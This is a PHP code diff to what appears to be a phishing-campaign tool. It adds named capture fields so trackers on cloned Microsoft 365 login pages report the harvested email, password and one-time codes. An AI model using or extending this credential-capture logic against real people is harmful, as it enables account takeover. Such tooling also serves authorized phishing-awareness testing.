@@ -656,7 +656,19 @@ if (isset($_POST)) {
 				while (checkAnIDExist($conn, $tracker_id, 'tracker_id', 'tb_core_web_tracker_list')) {
 					$tracker_id = getRandomStr(6);
 				}
-				$built = taphish_wizard_build_minimal_tracker($tracker_id, $tracker_name, $webhook_url);
+				// Optional capture-field schema: when the caller knows the
+				// landing's funnel fields (e.g. a cloned m365-login* template's
+				// meta.json `fields`), pass them so the tracker is built with
+				// named Field-<name> columns and the captured email/password/
+				// OTP show up in the report instead of being stored-but-hidden.
+				$formFields = [];
+				if (is_array($POSTJ['form_fields'] ?? null)) {
+					$formFields = array_values(array_filter(
+						array_map(static fn ($f) => trim((string) $f), $POSTJ['form_fields']),
+						static fn (string $f): bool => $f !== '' && preg_match('/^[A-Za-z0-9_-]{1,40}$/', $f) === 1
+					));
+				}
+				$built = taphish_wizard_build_minimal_tracker($tracker_id, $tracker_name, $webhook_url, $formFields);
 				$active = 1;
 				$stmt = $conn->prepare("INSERT INTO tb_core_web_tracker_list(tracker_id,tracker_name,content_html,content_js,tracker_step_data,active,date) VALUES(?,?,?,?,?,?,?)");
 				$ok = false;
